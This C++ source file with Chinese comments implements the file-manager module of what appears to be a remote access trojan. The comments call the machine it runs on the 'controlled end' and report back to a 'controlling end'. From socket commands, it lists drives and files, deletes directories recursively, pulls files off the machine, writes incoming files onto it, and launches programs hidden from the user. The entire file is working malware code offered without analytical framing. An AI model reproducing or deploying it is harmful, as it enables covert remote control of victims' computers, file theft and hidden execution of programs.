// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FileManager.h"
#include "Common.h"
#include "ClientSocket.h"
#include "SHELLAPI.H"
#include <IOSTREAM>

using namespace std;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
typedef struct                 //0dwSizeHighdwSizeLow
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;
CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;

	SendDriveList();   //

}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
}


UINT CFileManager::SendDriveList()              //获得被控端的磁盘信息
{
	char	DriveString[256];
	                                            // 前一个字节为消息类型，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST;            // 驱动器列表
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);

	//获得驱动器信息
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
    //0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\.


	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	

	//注意这里的dwOffset不能从0 因为0单位存储的是消息类型
	for (DWORD dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)   //这里的+1为了过\0
	{
		memset(FileSystem, 0, sizeof(FileSystem));
	
		// 得到文件系统信息及大小  C:
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
	
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive,FILE_ATTRIBUTE_NORMAL,&sfi,
			sizeof(SHFILEINFO), SHGFI_TYPENAME);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;   
		int	nFileSystemLen = lstrlen(FileSystem) + 1;  
		
		// 计算磁盘大小
		if (pDrive[0] != 'A' && pDrive[0] != 'B'
			&& GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, 
			(PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;         //这里获得是字节要转换成G
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];                     //盘符
		DriveList[dwOffset + 1] = GetDriveType(pDrive);      //驱动器的类型
		
		
		// 磁盘空间描述占去了8字节
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盘卷标名及磁盘类型
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;



	}
	
	return Send((LPBYTE)DriveList, dwOffset);    //向主控端发送数据
}


void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 获取文件列表
		{
			SendFilesList((char *)lpBuffer + 1);   //第一个字节是消息 后面的是路径
			break;
		}
	
	case COMMAND_RENAME_FILE:
		{
			Rename(lpBuffer + 1);
			break;
		}

	case COMMAND_DELETE_FILE:                      //删除文件
		{
			DeleteFile((char *)lpBuffer + 1);
			SendToken(TOKEN_DELETE_FINISH);
			break;
		}
	
	case COMMAND_DELETE_DIRECTORY:				   //删除文件夹
		{
			DeleteDirectory((char *)lpBuffer + 1);
			SendToken(TOKEN_DELETE_FINISH);
			break;
		}

	case COMMAND_CREATE_FOLDER:                   //创建一个新的文件夹
		{
			CreateFolder(lpBuffer + 1);
			break;

		}
	case COMMAND_FILE_SIZE:                       //准备接受文件
		{
			CreateLocalRecvFile(lpBuffer + 1);
			break;
		}

	case COMMAND_DOWN_FILES:                      //准备发送文件
		{
			UploadToRemote(lpBuffer + 1);
			break;
		}

	case COMMAND_CONTINUE:                        //发送文件
		{
			SendFileData(lpBuffer + 1);
			break;
		}
	
	case COMMAND_SET_TRANSFER_MODE:
		{
			SetTransferMode(lpBuffer + 1);
			break;
		}	
	case COMMAND_FILE_DATA:
		{
			WriteLocalRecvFile(lpBuffer + 1, nSize -1);
			break;
		}
	case COMMAND_STOP:
		{
			StopTransfer();
			break;
		}
	case COMMAND_OPEN_FILE_SHOW:                               //显示运行程序
		{
			OpenFile((char *)lpBuffer + 1, SW_SHOW);
			break;
		}
	
	case COMMAND_OPEN_FILE_HIDE:
		{
			OpenFile((char *)lpBuffer + 1, SW_HIDE);		    //隐藏运行程序
			break;
		}
	
	default:
		break;
	}
}


UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, "%s\\*.*", lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);           //路径错误
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// 文件属性 1 字节
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// 文件大小 8 字节
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}


void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE)                    // 如果没有找到或查找失败
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind);                              // 关闭查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}



bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;        
            p++;            

             while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            if(*p)
            {
                p++;
            }
            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) 
        {
            p++;
            p++;

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                 
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
      
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}


void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);  //已经越过消息头了
	
	// 保存文件长度
	m_nCurrentProcessFileLength = 
		(pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE); //如果有相同的文件
	}
	else
	{
		GetFileData();                      //如果没有相同的文件就会执行到这里
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()           
{
	int	nTransferMode;
	switch (m_nTransferMode)   //如果没有相同的数据是不会进入Case中的
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
	
		// 覆盖
		if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if(nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);  //1  4 -1
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{

		memset(bToken + 1, 0, 8);                //没有相同的文件会走到这里
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	CloseHandle(hFile);
	
	Send(bToken,sizeof(bToken));        //向主控制端发送TOKEN_DATA_CONTINUE消息
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;
	
	// 得到数据在文件中的偏移
	
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	
	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
	// 写入文件
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);

	CloseHandle(hFile);	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;//TOKEN_DATA_CONTINUE
	dwOffsetLow += dwBytesWrite;    //8183
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));


	//1 0  8183  
}





bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{   //01234567890AB

	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')   //如果是一个文件夹
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();                      //如果是空文件夹我们就停止传输                             
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);          //如果是一个文件
	}
	
	list <string>::iterator it = m_UploadList.begin();

	//

	
	// 发送第一个文件
	SendFileSize((*it).c_str());
	
	return true;
}


bool CFileManager::FixedUploadList(LPCTSTR lpPathName)  // Music 1 1.txt 2.txt    3.txt
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
		
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE)             //如果没有找到或查找失败
		return false;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);    //是文件夹的就递归
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);  //是文件就插入到结构中 STL 
				//\music\1\1.txt0  \Music\1\2.txt  F:\Musi\3.txt   F:1.txt  2.txt  3.txt  F:bauud\1\1.txt  
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	return true;
}


UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);
	
	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}



UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;
	
	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;
	
	// 远程跳过，传送下一个
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;
	
	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);
	
	
	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}
	
	LocalFree(lpPacket);
	
	return nRet;
}


void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}



void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}


bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');   //定位到最后一个.也就是我们要文件属性
	if (!lpExt)
		return false;
	

	//查询主键是否存在
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);


	//查询子键是否存在
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default";    //是否隐藏
	}
	else
	{
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;

		//cout<<"HideProcess"<<endl;
	}
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}